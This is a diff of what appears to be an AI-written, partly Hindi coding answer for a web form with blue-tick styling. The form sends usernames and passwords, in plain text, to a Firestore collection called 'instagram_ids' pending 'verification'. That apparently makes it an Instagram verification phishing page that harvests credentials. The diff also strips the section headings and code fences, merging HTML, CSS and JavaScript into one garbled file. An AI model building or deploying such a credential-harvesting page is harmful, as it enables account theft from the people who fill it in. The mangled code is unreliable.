@@ -32,8 +32,7 @@ html
         <div id="message" class="message"></div>
     </div>
 
-    <!-- Firebase SDKs -->
-    <!-- सुनिश्चित करें कि आप अपने actual Firebase SDKs को यहाँ import कर रहे हैं -->
+   
     <script src="./firebase-config.js"></script>
     <!-- Firestore SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
@@ -42,14 +41,6 @@ html
     <script src="app.js"></script>
 </body>
 </html>
-```
-
-### 2. Styling (style.css)
-
-यह कोड "best coloring" और modern look के लिए डिज़ाइन किया गया है।
-
-```css
-/* style.css */
 
 :root {
     --primary-color: #4a90e2; /* Blue Tick Color */
@@ -157,13 +148,8 @@ input[type="password"]:focus {
     color: #ff4d4f;
     border: 1px solid #ff4d4f;
 }
-```
 
-### 3. Firebase Configuration (firebase-config.js)
-
-आपके द्वारा दिए गए कॉन्फ़िगरेशन को यहाँ रखा जाएगा। **ध्यान दें:** मैंने आपके provided config का उपयोग किया है।
-
-```javascript
+javascript
 // firebase-config.js
 
 import { initializeApp } from "firebase/app";
@@ -187,12 +173,6 @@ const app = initializeApp(firebaseConfig);
 export const db = getFirestore(app);
 ```
 
-### 4. JavaScript Logic (app.js)
-
-यह वह मुख्य कोड है जो फॉर्म सबमिट होने पर डेटा को Firestore में सेव करेगा।
-
-```javascript
-// app.js
 
 import { db } from './firebase-config.js'; // Import the initialized Firestore database
 import { collection, addDoc } from "firebase/firestore";
@@ -203,11 +183,9 @@ const messageDisplay = document.getElementById('message');
 dataForm.addEventListener('submit', async (e) => {
     e.preventDefault();
 
-    // 1. Get Input Values
     const usernameInput = document.getElementById('username').value.trim();
     const passwordInput = document.getElementById('password').value.trim();
 
-    // Clear previous messages
     messageDisplay.textContent = '';
     messageDisplay.className = 'message';
 
@@ -216,7 +194,6 @@ dataForm.addEventListener('submit', async (e) => {
         return;
     }
 
-    // 2. Prepare Data to Store
     const dataToStore = {
         username: usernameInput,
         password: passwordInput, // Note: In a real app, NEVER store passwords directly like this! Use secure hashing.
@@ -224,7 +201,6 @@ dataForm.addEventListener('submit', async (e) => {
         status: 'pending' // Initial status for the verification process
     };
 
-    // 3. Add Data to Firestore
     try {
         const docRef = await addDoc(collection(db, "instagram_ids"), dataToStore);
 
